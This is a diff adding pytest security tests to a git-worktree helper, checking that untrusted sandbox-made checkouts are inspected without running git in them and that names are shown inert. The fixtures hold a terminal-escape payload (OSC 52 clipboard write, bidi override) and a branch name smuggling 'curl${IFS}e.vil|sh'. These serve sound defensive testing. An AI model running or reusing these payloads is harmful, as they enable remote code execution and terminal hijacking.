@@ -71,6 +71,7 @@ def fake_main(tmp_path, monkeypatch):
         "origin_head": None,
         "registered": set(),
         "list_rc": 0,  # what `worktree list` exits with
+        "listed_branch": {},  # path → the branch `worktree list` names for it (default: none)
     }
     teardown: list[str] = []  # records the box+stack teardown remove() drives
 
@@ -111,7 +112,12 @@ def fake_main(tmp_path, monkeypatch):
             return _Proc(0)
         if g and "worktree" in cmd and "list" in cmd:  # registration probe (orphan detection)
             # Porcelain, as git writes it: each path verbatim, newlines and all.
-            listing = "".join(f"worktree {p}\nHEAD {BRANCH_OID}\n\n" for p in state["registered"])
+            listing = "".join(
+                f"worktree {p}\nHEAD {BRANCH_OID}\n"
+                + (f"branch refs/heads/{b}\n" if (b := state["listed_branch"].get(p)) else "")
+                + "\n"
+                for p in state["registered"]
+            )
             return _Proc(state["list_rc"], "" if state["list_rc"] else listing)
         if g and "show-ref" in cmd:
             return _Proc(0 if cmd[-1] in state["refs"] else 1)
@@ -1311,6 +1317,231 @@ def test_list_marks_a_worktree_the_host_has_no_record_of(fake_main, capsys):
     assert "(not registered)" in next(line for line in lines if " old " in line)
     assert "(not registered)" not in next(line for line in lines if " feat " in line)
     assert any("fy worktree add <name>" in line for line in lines)
+
+
+# ── a checkout your computer has no record of: nothing runs in it, and its names are inert ──
+#
+# The worktrees root is box-writable: a dir there is named by the box, and its `.git` file can name
+# a git dir (and with it a config) the box built. So `list`, `add` on an existing one and `remove`
+# read its branch from its HEAD in main's `.git/worktrees` instead of asking git in it, and every
+# name is printed with its control characters shown as escapes.
+
+UNPRINTABLE = "\x1b]52;c;aGk=\x07\x9b2J\N{RIGHT-TO-LEFT OVERRIDE}"  # OSC 52, a C1 CSI, a bidi flip
+CONTROLS = {"\x1b", "\x07", "\x9b", "\N{RIGHT-TO-LEFT OVERRIDE}"}
+# Git's ref-name rules ban C0 controls, not C1 or bidi ones: a branch can carry these.
+IN_A_REF = "\x9b2J\N{RIGHT-TO-LEFT OVERRIDE}"
+
+
+def _box_made_checkout(fake_main, name: str, head: str, *, gitdir: str | None = None) -> Path:
+    """A checkout made by `git worktree add` in a box: its admin dir in main's `.git/worktrees`
+    (with ``head`` as its HEAD), a `.git` file naming it (``gitdir``, else its absolute path), and
+    git listing it."""
+    admin = fake_main["main"] / ".git" / "worktrees" / name
+    admin.mkdir(parents=True)
+    (admin / "HEAD").write_text(head)
+    wt = fake_main["wt_root"] / name
+    wt.mkdir(parents=True)
+    (wt / ".git").write_text(f"gitdir: {gitdir or admin}\n")
+    fake_main["state"]["registered"].add(str(wt))
+    return wt
+
+
+def _git_ran_in(calls: list[list[str]], wt: Path) -> bool:
+    return any(c[:1] == ["git"] and str(wt) in c[c.index("-C") + 1 : c.index("-C") + 2]
+               for c in calls if "-C" in c)  # fmt: skip
+
+
+def test_list_runs_no_git_in_a_checkout_it_has_no_record_of(fake_main, capsys):
+    wt = _box_made_checkout(fake_main, "boxed", "ref: refs/heads/wt/boxed\n")
+    assert worktree.list_() == 0
+    assert not _git_ran_in(fake_main["calls"], wt)
+    line = next(ln for ln in capsys.readouterr().out.splitlines() if " boxed " in ln)
+    assert "wt/boxed" in line  # read from its HEAD in main's .git, not asked of git
+
+
+def test_list_asks_git_for_a_registered_checkouts_branch(fake_main, capsys):
+    assert worktree.add("feat") == 0
+    capsys.readouterr()
+    assert worktree.list_() == 0
+    assert _git_ran_in(fake_main["calls"], fake_main["wt_root"] / "feat")
+
+
+def test_a_detached_head_reads_as_git_would_say_it(fake_main, capsys):
+    _box_made_checkout(fake_main, "boxed", f"{BRANCH_OID}\n")
+    assert worktree.list_() == 0
+    line = next(ln for ln in capsys.readouterr().out.splitlines() if " boxed " in ln)
+    assert " HEAD " in line  # `rev-parse --abbrev-ref HEAD` on a detached checkout
+
+
+def test_a_git_dir_outside_mains_worktrees_is_not_read(fake_main, tmp_path, capsys):
+    """The box writes the `.git` file: a git dir it built elsewhere names no branch."""
+    planted = tmp_path / "planted"
+    planted.mkdir()
+    (planted / "HEAD").write_text("ref: refs/heads/planted\n")
+    wt = fake_main["wt_root"] / "boxed"
+    wt.mkdir(parents=True)
+    (wt / ".git").write_text(f"gitdir: {planted}\n")
+    assert worktree.list_() == 0
+    assert "planted" not in capsys.readouterr().out
+    assert not _git_ran_in(fake_main["calls"], wt)
+
+
+def test_a_linked_admin_dir_is_not_followed(fake_main, tmp_path, capsys):
+    planted = tmp_path / "planted"
+    planted.mkdir()
+    (planted / "HEAD").write_text("ref: refs/heads/planted\n")
+    home = fake_main["main"] / ".git" / "worktrees"
+    home.mkdir(parents=True)
+    (home / "boxed").symlink_to(planted)
+    wt = fake_main["wt_root"] / "boxed"
+    wt.mkdir(parents=True)
+    (wt / ".git").write_text(f"gitdir: {home / 'boxed'}\n")
+    assert worktree.list_() == 0
+    assert "planted" not in capsys.readouterr().out
+
+
+def test_list_shows_a_box_chosen_name_and_branch_inert(fake_main, capsys):
+    _box_made_checkout(fake_main, f"x{UNPRINTABLE}", f"ref: refs/heads/b{IN_A_REF}\n")
+    assert worktree.list_() == 0
+    out = capsys.readouterr().out
+    assert not CONTROLS & set(out)
+    assert "x\\x1b]52" in out and "b\\x9b2J" in out  # shown, as its escapes
+
+
+def test_add_on_an_existing_checkout_runs_no_git_in_it(fake_main, monkeypatch, capsys):
+    wt = _box_made_checkout(fake_main, "old", f"ref: refs/heads/wt/old{IN_A_REF}\n")
+    monkeypatch.setattr("builtins.input", lambda *a: "y")
+    assert worktree.add("old") == 0
+    assert not _git_ran_in(fake_main["calls"], wt)
+    out = capsys.readouterr().out
+    assert "(branch wt/old\\x9b2J" in out and not CONTROLS & set(out)
+
+
+def test_add_names_the_branch_it_forks_off_inert(fake_main, capsys):
+    """`origin/HEAD` is in the shared `.git` the box writes: the default branch it names is shown
+    with its control characters as escapes."""
+    fake_main["state"]["origin_head"] = f"refs/remotes/origin/m{UNPRINTABLE}"
+    assert worktree.add("feat") == 0
+    out = capsys.readouterr().out
+    assert "new branch off origin/m\\x1b]52" in out and not CONTROLS & set(out)
+
+
+def test_remove_runs_no_git_in_a_checkout_it_has_no_record_of(fake_main, capsys):
+    wt = _box_made_checkout(fake_main, "boxed", f"ref: refs/heads/wt/boxed{IN_A_REF}\n")
+    assert worktree.remove("boxed", assume_yes=True) == 0
+    assert not any(
+        c[:1] == ["git"] and "rev-parse" in c and str(wt) in c for c in fake_main["calls"]
+    )
+    out = capsys.readouterr().out
+    assert "branch 'wt/boxed\\x9b2J" in out and not CONTROLS & set(out)
+
+
+@pytest.mark.parametrize(
+    "ref",
+    [
+        f"wt/x{UNPRINTABLE}",  # a C0 control
+        "wt/x y",
+        "wt/a..b",
+        "wt/x~1",
+        "wt/x:y",
+        "wt/x?",
+        "wt/x*",
+        "wt/x[y",
+        "wt/x\\y",
+        "wt/x@{1}",
+        "-x",
+        "wt/x.lock",
+        "wt/x/",
+        "wt/x.",
+        "wt/" + "x" * 300,  # past any name a branch would have
+    ],
+)
+def test_a_head_naming_no_ref_git_would_take_shows_no_branch(fake_main, capsys, ref):
+    _box_made_checkout(fake_main, "boxed", f"ref: refs/heads/{ref}\n")
+    assert worktree._branch_read(fake_main["main"], fake_main["wt_root"] / "boxed") == ""
+
+
+def test_the_remove_hint_quotes_the_branch(fake_main, capsys):
+    """A ref name git takes can still be a shell command once pasted: the hint quotes it."""
+    _box_made_checkout(fake_main, "boxed", "ref: refs/heads/x;curl${IFS}e.vil|sh\n")
+    assert worktree.remove("boxed", assume_yes=True) == 0
+    assert "git branch -D 'x;curl${IFS}e.vil|sh'" in capsys.readouterr().out
+
+
+def test_a_reftable_repos_placeholder_head_is_no_branch(fake_main, capsys):
+    """A reftable repo (git 2.45+) keeps a worktree's HEAD in its ref store, and the admin dir's
+    HEAD file is a placeholder: the branch is the one main's `git worktree list` names."""
+    wt = _box_made_checkout(fake_main, "boxed", "ref: refs/heads/.invalid\n")
+    assert worktree._branch_read(fake_main["main"], wt) == ""
+    fake_main["state"]["listed_branch"][str(wt)] = "wt/boxed"
+    assert worktree._branch_read(fake_main["main"], wt) == "wt/boxed"
+    assert not _git_ran_in(fake_main["calls"], wt)
+    assert worktree.list_() == 0
+    assert ".invalid" not in capsys.readouterr().out
+
+
+def test_a_relative_git_file_is_read(fake_main):
+    """`worktree.useRelativePaths` (git 2.48+) writes the `.git` file relative to the checkout."""
+    wt = _box_made_checkout(
+        fake_main, "boxed", "ref: refs/heads/wt/boxed\n", gitdir="../../repo/.git/worktrees/boxed"
+    )
+    assert worktree._branch_read(fake_main["main"], wt) == "wt/boxed"
+
+
+def test_a_relative_git_file_leading_out_of_mains_worktrees_is_not_read(fake_main, tmp_path):
+    planted = tmp_path / "planted" / "boxed"
+    planted.mkdir(parents=True)
+    (planted / "HEAD").write_text("ref: refs/heads/planted\n")
+    wt = fake_main["wt_root"] / "boxed"
+    wt.mkdir(parents=True)
+    (wt / ".git").write_text("gitdir: ../../planted/boxed\n")
+    assert worktree._branch_read(fake_main["main"], wt) == ""
+
+
+def _head_as(fake_main, make) -> Path:
+    """A box-made checkout whose admin dir's HEAD is whatever ``make(path)`` puts there."""
+    wt = _box_made_checkout(fake_main, "boxed", "")
+    head = fake_main["main"] / ".git" / "worktrees" / "boxed" / "HEAD"
+    head.unlink()
+    make(head)
+    return wt
+
+
+def test_a_fifo_head_is_no_branch_and_does_not_hang(fake_main):
+    """The box can make HEAD a FIFO: opening one for reading blocks until a writer comes."""
+    import threading
+
+    wt = _head_as(fake_main, os.mkfifo)
+    got: list[str] = []
+    reader = threading.Thread(
+        target=lambda: got.append(worktree._branch_read(fake_main["main"], wt)), daemon=True
+    )
+    reader.start()
+    reader.join(timeout=5)
+    assert not reader.is_alive(), "blocked opening a FIFO"
+    assert got == [""]
+
+
+def test_a_linked_head_is_not_followed(fake_main, tmp_path):
+    outside = tmp_path / "outside"
+    outside.write_text("ref: refs/heads/planted\n")
+    wt = _head_as(fake_main, lambda head: head.symlink_to(outside))
+    assert worktree._branch_read(fake_main["main"], wt) == ""
+
+
+def test_a_head_that_is_no_file_is_no_branch(fake_main):
+    wt = _head_as(fake_main, lambda head: head.mkdir())
+    assert worktree._branch_read(fake_main["main"], wt) == ""
+
+
+def test_add_on_an_existing_checkout_in_a_reftable_repo_names_its_branch(
+    fake_main, monkeypatch, capsys
+):
+    wt = _box_made_checkout(fake_main, "old", "ref: refs/heads/.invalid\n")
+    fake_main["state"]["listed_branch"][str(wt)] = "wt/old"
+    monkeypatch.setattr("builtins.input", lambda *a: "y")
+    assert worktree.add("old") == 0
+    assert "(branch wt/old)" in capsys.readouterr().out
 
 
 # ── remove: transcript-guarded teardown ─────────────────────────────────────────────
